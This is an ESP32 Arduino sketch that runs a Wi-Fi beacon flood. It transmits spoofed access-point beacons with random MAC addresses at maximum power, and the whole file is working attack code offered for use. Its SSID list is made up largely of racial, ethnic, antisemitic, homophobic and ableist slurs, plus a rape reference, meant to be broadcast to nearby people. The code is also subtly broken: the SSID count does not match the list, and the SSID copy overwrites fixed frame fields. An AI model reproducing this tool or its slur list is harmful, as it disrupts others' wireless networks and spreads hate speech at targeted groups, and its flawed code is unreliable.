#include "WiFi.h"

extern "C" {
#include "esp_wifi.h"
esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

const char* ssidList[] = {
  "Nate Higgers",
  "Furn Bags",
  "Evo Fag-Knight",
  "Jewish Hitler",
  "Nitch Bigger",
  "Gabe Itch",
  "Hitlers My Goat",
  "Beaner Beater",
  "Dune Coon",
  "Camel Jockey",
  "Sand Nigger",
  "Dirka Dirka",
  "Asian Math Problem",
  "Al Qaeda's Wifi",
  "A Cracker's Slave",
  "Fuck Curry Munchers",
  "Lib Tard",
  "I love Jiggaboos",
  "Gold Sniffer",
  "A Kike Stole a Bike",
  "Niglets4Sale",
  "Pajeet's Camel",
  "CoinSlot Eye's Exam",
  "Retarded Spook",
  "Retarded Tardy",
  "Jas the Gews",
  "Go Away Faggots",
  "Kick the Fags out",
  "Dad Rape Fags"

};

const int ssidCount = 9;
const uint8_t wifi_channel = 6; // Max visibility
const uint8_t beaconRepeat = 20; // Ultra flood

uint8_t macAddr[6];
uint32_t packetCounter = 0, lastPrintTime = 0;

void randomMac() {
  for (int i = 0; i < 6; i++) macAddr[i] = random(256);
}

// Max TX power (20.5 dBm)
void setMaxTxPower() {
  esp_wifi_set_max_tx_power(78);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_MODE_STA);
  delay(100);
  randomSeed(esp_random());

  esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
  setMaxTxPower();

  Serial.println("☢️ EXTREME SSID FLOOD INITIATED ☢");
}

void loop() {
  for (int i = 0; i < ssidCount; i++) {
    const char* ssid = ssidList[i];
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    uint8_t beaconPacket[128] = {
      0x80, 0x00, 0x00, 0x00,                         // Beacon Frame Control
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination: Broadcast
      0, 0, 0, 0, 0, 0,                               // Source MAC
      0, 0, 0, 0, 0, 0,                               // BSSID
      0x00, 0x00,                                     // Seq
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
      0xe8, 0x03,                                     // Interval
      0x31, 0x00,                                     // Capabilities

      0x00,                                           // SSID Tag
      ssidLen,                                        // SSID Length
      // [SSID inserted dynamically below]

      0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // Supported Rates
      0x03, 0x01, wifi_channel, // Channel Tag

      // WPA2 RSN Tag
      0x30, 0x18,
      0x01, 0x00,
      0x00, 0x0f, 0xac, 0x02,
      0x02, 0x00,
      0x00, 0x0f, 0xac, 0x04,
      0x00, 0x0f, 0xac, 0x04,
      0x01, 0x00,
      0x00, 0x0f, 0xac, 0x02,
      0x00, 0x00
    };

    int baseLen = 38;
    memcpy(&beaconPacket[baseLen], ssid, ssidLen);

    int packetSize = baseLen + ssidLen + 39;

    for (int r = 0; r < beaconRepeat; r++) {
      randomMac();

      memcpy(&beaconPacket[10], macAddr, 6); // Src MAC
      memcpy(&beaconPacket[16], macAddr, 6); // BSSID

      esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false);
      packetCounter++;
    }
  }

  if (millis() - lastPrintTime > 1000) {
    Serial.printf("⚡ Packets/s: %lu\n", packetCounter);
    packetCounter = 0;
    lastPrintTime = millis();
  }
}
